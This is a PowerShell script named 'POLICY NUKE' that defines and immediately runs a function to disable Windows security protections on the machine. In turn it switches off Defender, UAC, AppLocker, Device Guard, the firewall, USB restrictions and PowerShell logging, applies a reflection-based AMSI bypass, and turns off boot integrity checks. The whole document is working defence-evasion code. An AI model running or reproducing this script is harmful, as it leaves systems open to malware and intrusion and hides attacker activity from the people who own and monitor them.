# STUA-X: POLICY NUKE (Run as Administrator)
function Invoke-PolicyNuke {
    # Disable Execution Policy
    Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine
    Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser
    Set-ExecutionPolicy Bypass -Force -Scope Process

    # Disable Defender (Real-Time Protection, Tamper Protection, Cloud-Delivered Protection)
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableThreatIntelligence $true
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1 -Force

    # Disable UAC (User Account Control)
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force

    # Disable Applocker (If Enabled)
    Remove-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Srp\Gp\Exe" -Recurse -Force -ErrorAction SilentlyContinue

    # Disable Device Guard (Virtualization-Based Security)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 0 -Force

    # Disable Windows Firewall
    netsh advfirewall set allprofiles state off
    Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled False

    # Disable USB Restrictions
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" -Name "Start" -Value 3 -Force
    Remove-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Recurse -Force -ErrorAction SilentlyContinue

    # Disable Script Block Logging (PowerShell)
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force

    # Disable Constrained Language Mode
    $ExecutionContext.SessionState.LanguageMode = "FullLanguage"

    # Disable AMSI (Antimalware Scan Interface)
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

    # Disable WDAC (Windows Defender Application Control)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Force

    # Disable Secure Boot (If Possible)
    bcdedit /set { current } testsigning on
    bcdedit /set nointegritychecks on

    Write-Host "[+] All policies disabled. System is now unrestricted." -ForegroundColor Green
}

Invoke-PolicyNuke